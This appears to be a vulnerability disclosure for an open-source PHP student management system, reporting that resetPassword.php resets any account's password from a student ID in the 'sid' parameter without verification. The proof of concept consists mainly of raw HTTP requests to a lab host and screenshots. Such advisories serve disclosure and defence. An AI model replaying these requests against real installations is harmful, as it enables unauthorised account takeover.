# student-management-system resetPassword.php user password reset

   
#### Exploit Title: student-management-system resetPassword.php user password reset
#### Exploit Author: webraybtl@webray.com.cn inc
#### Vendor Homepage: https://github.com/ningzichun/student-management-system
#### Software Link: https://github.com/ningzichun/student-management-system
#### Version: student-management-system 1.0
#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description
The step of modifying the password was not verified, resulting in the ability to directly enter the website where the final password was modified, directly redirect to the page, and then enter a new password to reset the password, resulting in a everybody password reset student-management-system does not filter the content correctly at the "resetPassword.php" sid module, resulting in anyone password reset.

#### Payload used:
test account:201600012489
`/resetPassword.php?sid=xxxx`

#### Proof of Concept


1. Open login.php source code.

![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/09c9d16d-8893-40be-8d43-f953619242f8)
2. request a getUser.php response.
```
GET /student/admin/fun/getUser.php HTTP/1.1
Host: 172.24.6.107:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Origin: http://172.24.6.107:8081
Connection: close
Referer: http://172.24.6.107:8081/student/?retry=1
Cookie: PHPSESSID=
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache


```
![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/205b0b56-c798-43a7-8da7-72b930833d19)


3. request a resetPassword.php response.

![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/01fc6eed-31ad-4e62-b92f-572754c71785)

```
GET /student/admin/fun/resetPassword.php?sid=201600012489 HTTP/1.1
Host: 172.24.6.107:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Origin: http://172.24.6.107:8081
Connection: close
Referer: http://172.24.6.107:8081/student/?retry=1
Cookie: PHPSESSID=
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

```

4. user login

![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/e41ff0f2-2866-4ade-be98-dc40f57677b5)
![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/bb867c0d-537c-4ae6-8d5d-a1d7ab770dba)



